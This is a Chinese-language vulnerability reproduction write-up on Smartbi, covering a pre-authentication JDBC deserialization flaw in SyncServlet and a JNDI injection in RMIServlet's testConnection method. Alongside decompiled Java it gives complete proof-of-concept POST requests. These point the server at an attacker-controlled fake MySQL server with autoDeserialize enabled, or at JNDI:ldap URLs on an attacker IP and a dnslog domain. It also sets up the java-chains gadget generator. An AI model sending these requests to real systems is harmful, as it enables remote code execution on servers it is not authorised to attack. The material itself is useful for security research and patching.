1. 根据依赖版本确定存在漏洞
2. 根据依赖的敏感函数找入口点

## 前台JDBC反序列化

### 漏洞分析：

E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncServlet.class

```java
public class SyncServlet extends HttpServlet {
    ...
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        ServletOutputStream oos = response.getOutputStream();
        File tmpFile = null;
        FileOutputStream fos = null;
        FileInputStream fis = null;
        String actionType = StringUtil.getLanguageValue("Synchronization");

        try {
            if (!ServletFileUpload.isMultipartContent(request)) {
                request.setCharacterEncoding("UTF-8");
                String type = request.getParameter("type");
                response.setBufferSize(4096);
                if (type.equals("sqldictsync")) {
                    long startTime = System.currentTimeMillis();
                    //从请求中提取数据库连接配置和查询语句
                    String dbType = request.getParameter("dbType");
                    String dbServer = request.getParameter("dbServer");
                    String dbName = request.getParameter("dbName");
                    String dbUser = request.getParameter("dbUser");
                    String dbPass = request.getParameter("dbPass");
                    String querySql = request.getParameter("querySql");
                    boolean dbNameOnly = "true".equals(request.getParameter("dbNameOnly"));
                    String clientId = null;
                    log.debug("sqldictsync[dbName:" + dbName + ",dbNameOnly:" + dbNameOnly + ",querySql:" + querySql + "]");
                    if (dbNameOnly) {
                        clientId = (new SyncResources()).synchronize(dbName, querySql);
                    } else {
                        clientId = (new SyncResources()).synchronize(dbType, dbServer, dbName, dbUser, dbPass, querySql);
                    }
```

跟进 synchronize

```java
public class SyncResources {
    ...
    public String synchronize(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String querySql) throws Exception {
        //调用 DbUtil.getConnection() 获取数据库连接
        Connection conn = DbUtil.getConnection(dbType, dbServer, dbName, dbUser, dbPass, (String)null);
        if (conn == null) {
            throw new IllegalArgumentException(StringUtil.getLanguageValue("Incomingconnectionparametererrorestablishconnectionfailed"));
        } else {
            int colsCount = 8;
            Reader reader = new ResultSetReader(conn, querySql, colsCount);
            DictTree tree = new DictTree(reader);
            return this.doSynchronize(tree);
        }
    }

```

跟进 DbUtil.getConnection

```Java
public class DbUtil {
    ...
    public static Connection getConnection(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String connName) throws Exception {
        DBType driverType = null;

        try {
            //将传入的 dbType 字符串转为大写并在 DBType 中查找；如果输入非法，抛出异常并返回 null
            driverType = DBType.valueOf(dbType.toUpperCase());
        } catch (Exception var9) {
            return null;
        }

        //translateDriverInfo() 方法：根据数据库类型、服务器地址、数据库名,生成数据库连接配置，如："jdbc:db2://" + serverName + "/" + dbName
        String[] drvInfo = translateDriverInfo(driverType, dbServer, dbName);
        if (drvInfo == null) {
            return null;
        } else {
            //创建 DefaultConnectionInfo 实例，用于表示连接信息
            DefaultConnectionInfo info = new DefaultConnectionInfo();
            info.setId(UUIDGenerator.generate());
            info.setName(connName);
            info.setDriverType(driverType);
            info.setDriver(drvInfo[0]);
            info.setUrl(drvInfo[1]);
            info.setUser(dbUser);
            info.setPassword(dbPass);
            //获取数据库连接
            return ConnectionPool.getInstance().getConnection(info);
        }
    }
    
    public static String[] translateDriverInfo(DBType dbType, String serverName, String dbName, String dbEncoding) {
        String[] result = new String[2];
        switch (dbType) {
            case DB2:
            case DB2_400:
                result[0] = "COM.ibm.db2.jdbc.net.DB2Driver";
                result[1] = "jdbc:db2://" + serverName + "/" + dbName;
                break;
            case DB2_V9:
                result[0] = "com.ibm.db2.jcc.DB2Driver";
                if (serverName.indexOf(":") == -1) {
                    result[1] = "jdbc:db2://" + serverName + ":50000/" + dbName + ":deferPrepares=false;";
                } else {
                    result[1] = "jdbc:db2://" + serverName + "/" + dbName + ":deferPrepares=false;";
                }
                break;
            case INFORMIX:
                result[0] = "com.informix.jdbc.IfxDriver";
                result[1] = serverName;
                break;
            case MYSQL:
            case INFOBRIGHT:
                result[0] = "com.mysql.jdbc.Driver";
                if (dbEncoding == null) {
                    dbEncoding = "GBK";
                }

                if ("mysqlCluster=true".equals(dbType.getProp())) {
                    result[1] = "jdbc:mysql:loadbalance://" + serverName + "/" + dbName;
                    if (dbName.indexOf("?") == -1) {
                        result[1] = result[1] + "?useServerPrepStmts=true&autoReconnect=true&roundRobinLoadBalance=true&failOverReadOnly=false&characterEncoding=" + dbEncoding;
                    }
                } else {
                    result[1] = "jdbc:mysql://" + serverName + "/" + dbName;
                    if (dbName.indexOf("?") == -1) {
                        result[1] = result[1] + "?useServerPrepStmts=true&useOldAliasMetadataBehavior=true&useUnicode=true&characterEncoding=" + dbEncoding;
                    }
                }
                break;
            case MSSQL:
                ......
```

漏洞点产生在 `translateDriverInfo` ，此处可以拼接恶意数据库

### 漏洞复现：



构造POC：

```
type=sqldictsync&dbNameOnly=false&dbType=MYSQL&dbServer=[本机IP]:3308&dbName=d5a442d?detectCustomCollations=true&autoDeserialize=yes
```

```
POST /smartbi/vision/SyncServlet HTTP/1.1
Host: localhost:18080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded;
Content-Length: 138

type=sqldictsync&dbNameOnly=false&dbType=MYSQL&dbServer=[本机IP]:3308&dbName=d5a442d?detectCustomCollations=true%26autoDeserialize=yes
```

同样的，开启3308端口，搭建FakeMysql服务器，生成K1链

成功利用：

![20250806181941863](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702529.png)



## JNDI注入

### 漏洞分析：

![20250806192734078](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702526.png)



```Java
//如果数据库连接url是以JDNI开头
if (info.getUrl().startsWith("JNDI:")) {
    InitialContext cxt = new InitialContext();
    //去掉 JNDI 部分，保留后边部分，然后用 cxt.lookup 查找并返回 DataSource
    DataSource dataSource = (DataSource)cxt.lookup(info.getUrl().substring("JNDI:".length()));
    return dataSource.getConnection();
```













### 漏洞复现：

POC：

```
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: localhost:18080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Accept: */*
Origin: http://127.0.0.1
Referer: http://127.0.0.1:18080/smartbi/vision/index.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=5E67682266D39E9F1475ADA74B62E102
Connection : keep-alive
Content-Length: 466

className=DataSourceService&methodName=testConnection&params=[{"password"%3a"","maxConnection"%3a100,"user"%3a"","driverType"%3a"MYSQL","validationQuery"%3a"SELECT+1+FROM+DUAL","url"%3a"JNDI:ldap://[ip]:15089/bb4e07","name"%3a"JDBC","driver"%3a"com.mysql.jdbc.Driver","id"%3a"","desc"%3a"","alias"%3a"","dbCharset"%3a"","identifierQuoteString"%3a"`","transactionIsolation"%3a-1,"validationQueryMethod"%3a0,"dbToCharset"%3a"","authenticationType"%3a"STATIC"}]




className=DataSourceService&methodName=testConnection&params=[{"password"%3a"","maxConnection"%3a100,"user"%3a"","driverType"%3a"MYSQL","validationQuery"%3a"SELECT+1+FROM+DUAL","url"%3a"JNDI:ldap://9sjhyp.dnslog.cn","name"%3a"JDBC","driver"%3a"com.mysql.jdbc.Driver","id"%3a"","desc"%3a"","alias"%3a"","dbCharset"%3a"","identifierQuoteString"%3a"`","transactionIsolation"%3a-1,"validationQueryMethod"%3a0,"dbToCharset"%3a"","authenticationType"%3a"STATIC"}]

```

![20250806192146688](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703762.png)

生成K1链：

ldap://[ip]:15089/bb4e07

![20250806192251404](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703873.png)



![20250806191933929](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703089.png)



这里因为端口的问题没有利用成功。报错LDAP服务器未响应

Windows 系统**将 50389 端口作为排除范围**，不允许程序（包括 Docker）绑定使用它。安装JavaChains 时将 `  -p 50389:50389 ^`改成了  `-p 15089:50389 ^`，可能监听不到，

![20250806190250099](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703075.png)



使用dnslog

```
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: localhost:18080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Accept: */*
Origin: http://localhost
Referer: http://localhost:18080/smartbi/vision/index.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3D904649DC50813C9D6EDEBC582EE4CF
Connection : keep-alive
Content-Length: 457

className=DataSourceService&methodName=testConnection&params=[{"password"%3a"","maxConnection"%3a100,"user"%3a"","driverType"%3a"MYSQL","validationQuery"%3a"SELECT+1+FROM+DUAL","url"%3a"JNDI:ldap://9sjhyp.dnslog.cn","name"%3a"JDBC","driver"%3a"com.mysql.jdbc.Driver","id"%3a"","desc"%3a"","alias"%3a"","dbCharset"%3a"","identifierQuoteString"%3a"`","transactionIsolation"%3a-1,"validationQueryMethod"%3a0,"dbToCharset"%3a"","authenticationType"%3a"STATIC"}]


className=DataSourceService&methodName=testConnection&params=[{"password"%3a"","maxConnection"%3a100,"user"%3a"","driverType"%3a"MYSQL","validationQuery"%3a"SELECT+1+FROM+DUAL","url"%3a"JNDI:ldap://192.168.1.25:15089/547b87","name"%3a"JDBC","driver"%3a"com.mysql.jdbc.Driver","id"%3a"","desc"%3a"","alias"%3a"","dbCharset"%3a"","identifierQuoteString"%3a"`","transactionIsolation"%3a-1,"validationQueryMethod"%3a0,"dbToCharset"%3a"","authenticationType"%3a"STATIC"}]
```

ldap://192.168.1.25:15089/b69569

![20250806193947601](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703187.png)

![20250806194037543](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703694.png)

收到DNSLOG记录，说明漏洞存在







# 参考文章：

CVE-2020-1938 ：Apache Tomcat AJP 漏洞复现和分析

https://www.cnblogs.com/backlion/p/12870365.html

Smartbi 身份认证绕过漏洞

https://www.freebuf.com/vuls/373015.html

信息搜集相关：

https://ckcah.github.io/2020/05/01/googlehack/

https://94248.github.io/2023/07/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9B%B8%E5%85%B3/

servlet

https://86263008.github.io/web2024/back/java/jsp/servlet/index.html

https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11

https://blog.csdn.net/yxmoar/article/details/109889006

JDBC反序列化学习

https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/

https://xz.aliyun.com/news/7754

https://www.cnblogs.com/Litsasuk/articles/18410624

https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html

# **javachains使用**



https://java-chains.vulhub.org/zh/

```
# docker 搭建
docker pull javachains/javachains:latest

docker run -d ^
  --name java-chains ^
  --restart=always ^
  -p 8011:8011 ^
  -p 58080:58080 ^
  -p 15089:50389 ^
  -p 3308:3308 ^
  -p 13999:13999 ^
  -p 50000:50000 ^
  -p 11527:11527 ^
  -e CHAINS_AUTH=true ^
  -e CHAINS_PASS= ^
  javachains/javachains:latest

#查看当前正在运行的容器
docker ps

#查找日志中包含关键词 password 的行
docker logs java-chains | findstr password
>08-02 08:06:01.144 INFO  [main] c.a.c.w.c.SecurityConfig       |  | password: HDVhxC2MfhKJwcAN

#停止
docker stop java-chains

#删除
docker rm java-chains

```

> Windows 系统**将 50389 端口作为排除范围**，不允许程序（包括 Docker）绑定使用它。如果改端口可能有一些问题，还是尽量在Linux搭可以避免端口问题。
>
> ![20250806200152925](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703682.png)





访问 `localhost:8011`

![20250806200418498](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703554.png)

密码：`docker logs java-chains | findstr password`

![20250806200413737](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071704470.png)





































